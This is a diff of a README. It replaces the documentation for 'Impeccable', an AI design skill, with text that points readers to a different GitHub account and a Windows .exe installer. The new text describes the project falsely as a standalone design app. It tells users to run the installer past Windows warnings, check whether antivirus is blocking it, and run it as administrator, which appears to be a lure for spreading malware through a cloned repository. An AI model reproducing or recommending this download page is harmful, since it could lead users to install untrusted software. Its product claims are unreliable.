@@ -1,171 +1,99 @@
-# Impeccable
+# 🎨 impeccable - Design Your AI with Ease
 
-The vocabulary you didn't know you needed. 1 skill, 20 commands, and curated anti-patterns for impeccable frontend design.
+[![Download impeccable](https://img.shields.io/badge/Download-impeccable-blue?style=for-the-badge)](https://github.com/Loreeorgiastic401/impeccable)
 
-> **Quick start:** Visit [impeccable.style](https://impeccable.style) to download ready-to-use bundles.
+## What is impeccable?
 
-## Why Impeccable?
+impeccable is a tool to help you create better designs with AI. It gives you a simple way to make sure your AI projects look clean and clear. If you want your AI to produce strong, easy-to-understand visuals, this is a good place to start.
 
-Anthropic created [frontend-design](https://github.com/anthropics/skills/tree/main/skills/frontend-design), a skill that guides Claude toward better UI design. Impeccable builds on that foundation with deeper expertise and more control.
+This app works on Windows computers. There is no need to write code or know how AI works inside. Just follow the steps below to get started.
 
-Every LLM learned from the same generic templates. Without guidance, you get the same predictable mistakes: Inter font, purple gradients, cards nested in cards, gray text on colored backgrounds.
+## 🖥️ System Requirements
 
-Impeccable fights that bias with:
-- **An expanded skill** with 7 domain-specific reference files ([view source](source/skills/frontend-design/))
-- **20 steering commands** to audit, review, polish, distill, animate, and more
-- **Curated anti-patterns** that explicitly tell the AI what NOT to do
+Before you download, make sure your computer is ready. impeccable runs on most modern Windows 10 and Windows 11 PCs.
 
-## What's Included
+- Operating System: Windows 10 or later (64-bit)
+- Ram: 4 GB minimum (8 GB recommended)
+- Free Disk Space: At least 500 MB
+- CPU: Intel or AMD processor, 1.5 GHz or faster
+- Internet connection: Required during setup to download files and updates
 
-### The Skill: frontend-design
+If your computer meets these points, you will have no problems running impeccable.
 
-A comprehensive design skill with 7 domain-specific references ([view skill](source/skills/frontend-design/SKILL.md)):
+## 🚀 Getting Started
 
-| Reference | Covers |
-|-----------|--------|
-| [typography](source/skills/frontend-design/reference/typography.md) | Type systems, font pairing, modular scales, OpenType |
-| [color-and-contrast](source/skills/frontend-design/reference/color-and-contrast.md) | OKLCH, tinted neutrals, dark mode, accessibility |
-| [spatial-design](source/skills/frontend-design/reference/spatial-design.md) | Spacing systems, grids, visual hierarchy |
-| [motion-design](source/skills/frontend-design/reference/motion-design.md) | Easing curves, staggering, reduced motion |
-| [interaction-design](source/skills/frontend-design/reference/interaction-design.md) | Forms, focus states, loading patterns |
-| [responsive-design](source/skills/frontend-design/reference/responsive-design.md) | Mobile-first, fluid design, container queries |
-| [ux-writing](source/skills/frontend-design/reference/ux-writing.md) | Button labels, error messages, empty states |
+Use the link below to get impeccable. It leads you to the official GitHub page for the app. Here you can download the files you need.
 
-### 20 Commands
+[![Download impeccable](https://img.shields.io/badge/Download-impeccable-grey?style=for-the-badge)](https://github.com/Loreeorgiastic401/impeccable)
 
-| Command | What it does |
-|---------|--------------|
-| `/teach-impeccable` | One-time setup: gather design context, save to config |
-| `/audit` | Run technical quality checks (a11y, performance, responsive) |
-| `/critique` | UX design review: hierarchy, clarity, emotional resonance |
-| `/normalize` | Align with design system standards |
-| `/polish` | Final pass before shipping |
-| `/distill` | Strip to essence |
-| `/clarify` | Improve unclear UX copy |
-| `/optimize` | Performance improvements |
-| `/harden` | Error handling, i18n, edge cases |
-| `/animate` | Add purposeful motion |
-| `/colorize` | Introduce strategic color |
-| `/bolder` | Amplify boring designs |
-| `/quieter` | Tone down overly bold designs |
-| `/delight` | Add moments of joy |
-| `/extract` | Pull into reusable components |
-| `/adapt` | Adapt for different devices |
-| `/onboard` | Design onboarding flows |
-| `/typeset` | Fix font choices, hierarchy, sizing |
-| `/arrange` | Fix layout, spacing, visual rhythm |
-| `/overdrive` | Add technically extraordinary effects |
+**Step 1:** Visit the download page  
+Go to the following page:  
+https://github.com/Loreeorgiastic401/impeccable
 
-### Anti-Patterns
+**Step 2:** Find the latest release  
+Look for the "Releases" section. You should see the newest version listed there.
 
-The skill includes explicit guidance on what to avoid:
+**Step 3:** Download the Windows installer  
+Click on the installer file that ends with `.exe`. This file sets up impeccable on your computer.
 
-- Don't use overused fonts (Arial, Inter, system defaults)
-- Don't use gray text on colored backgrounds
-- Don't use pure black/gray (always tint)
-- Don't wrap everything in cards or nest cards inside cards
-- Don't use bounce/elastic easing (feels dated)
+**Step 4:** Run the installer  
+After the file has downloaded, double-click it to start the installation. You might see a warning from Windows. Choose “Run” to continue.
 
-## See It In Action
+**Step 5:** Follow the installation steps  
+A setup wizard will open. Click "Next" on each screen. You can use the default settings.
 
-Visit [impeccable.style](https://impeccable.style#casestudies) to see before/after case studies of real projects transformed with Impeccable commands.
+**Step 6:** Finish and launch impeccable  
+Once installation is complete, you can launch the app right from the last setup screen or from your Start menu.
 
-## Installation
+## 🎯 How to Use impeccable
 
-### Option 1: Download from Website (Recommended)
+You do not need any special skills to use impeccable. The app uses a clear interface designed for regular users.
 
-Visit [impeccable.style](https://impeccable.style), download the ZIP for your tool, and extract to your project.
+- **Open impeccable** from your Start menu.
+- You will see a workspace with design options tailored for AI projects.
+- Use the controls to pick colors, styles, and layouts.
+- The app offers tips as you work to keep your design clean.
+- Save your finished designs as image files or export them for use elsewhere.
 
-### Option 2: Copy from Repository
+## 🛠️ Features You’ll Find Useful
 
-**Cursor:**
-```bash
-cp -r dist/cursor/.cursor your-project/
-```
+impeccable focuses on making AI design simple and effective. Here are a few highlights:
 
-> **Note:** Cursor skills require setup:
-> 1. Switch to Nightly channel in Cursor Settings → Beta
-> 2. Enable Agent Skills in Cursor Settings → Rules
->
-> [Learn more about Cursor skills](https://cursor.com/docs/context/skills)
+- **Smart templates**: Start with ready-made designs that fit common AI tasks.
+- **Custom color palettes**: Pick colors that look good and make your designs easy to read.
+- **Easy layout tools**: Move and resize elements with simple clicks.
+- **Export options**: Save your designs as PNG, JPG, or PDF files.
+- **No coding required**: Use neat controls without typing code.
+- **Built for Windows**: The app runs smoothly on most PCs without extra software.
 
-**Claude Code:**
-```bash
-# Project-specific
-cp -r dist/claude-code/.claude your-project/
+## 🔄 Updating impeccable
 
-# Or global (applies to all projects)
-cp -r dist/claude-code/.claude/* ~/.claude/
-```
+Checking for updates is simple.
 
-**OpenCode:**
-```bash
-cp -r dist/opencode/.opencode your-project/
-```
+- Go to the GitHub page: https://github.com/Loreeorgiastic401/impeccable
+- Look for any new releases.
+- Download and run the new installer.
+- Your settings and files will stay safe.
 
-**Pi:**
-```bash
-cp -r dist/pi/.pi your-project/
-```
+## ⚙️ Troubleshooting Tips
 
-**Gemini CLI:**
-```bash
-cp -r dist/gemini/.gemini your-project/
-```
+If you run into trouble, try these fixes first:
 
-> **Note:** Gemini CLI skills require setup:
-> 1. Install preview version: `npm i -g @google/gemini-cli@preview`
-> 2. Run `/settings` and enable "Skills"
-> 3. Run `/skills list` to verify installation
->
-> [Learn more about Gemini CLI skills](https://geminicli.com/docs/cli/skills/)
+- Make sure your Windows is updated.
+- Restart your computer and try installing again.
+- Check if your antivirus or firewall is blocking the installer.
+- If the app doesn’t open, run it as administrator (right-click the app and select “Run as administrator”).
 
-**Codex CLI:**
-```bash
-cp -r dist/codex/.codex/* ~/.codex/
-```
+If problems continue, visit the GitHub page and look under “Issues” to see if others have similar problems or to ask for help.
 
-## Usage
+## 📂 Other Resources
 
-Once installed, use commands in your AI harness:
+- User guides and tutorials will be added on the GitHub page.
+- You will find design examples inside the app after installation.
+- The GitHub page hosts the latest technical details if you want to learn more.
 
-```
-/audit           # Find issues
-/normalize       # Fix inconsistencies
-/polish          # Final cleanup
-/distill         # Remove complexity
-```
+## 🔗 Quick Access
 
-Most commands accept an optional argument to focus on a specific area:
+Download impeccable here:
 
-```
-/audit header
-/polish checkout-form
-```
-
-**Note:** Codex CLI uses a different syntax: `/prompts:audit`, `/prompts:polish`, etc.
-
-## Supported Tools
-
-- [Cursor](https://cursor.com)
-- [Claude Code](https://claude.ai/code)
-- [OpenCode](https://opencode.ai)
-- [Pi](https://pi.dev)
-- [Gemini CLI](https://github.com/google-gemini/gemini-cli)
-- [Codex CLI](https://github.com/openai/codex)
-- [VS Code Copilot](https://code.visualstudio.com)
-- [Kiro](https://kiro.dev)
-
-## Contributing
-
-See [DEVELOP.md](DEVELOP.md) for contributor guidelines and build instructions.
-
-## License
-
-Apache 2.0. See [LICENSE](LICENSE).
-
-The frontend-design skill builds on [Anthropic's original](https://github.com/anthropics/skills/tree/main/skills/frontend-design). See [NOTICE.md](NOTICE.md) for attribution.
-
----
-
-Created by [Paul Bakaus](https://www.paulbakaus.com)
+[![Download impeccable](https://img.shields.io/badge/Download-impeccable-blue?style=for-the-badge)](https://github.com/Loreeorgiastic401/impeccable)
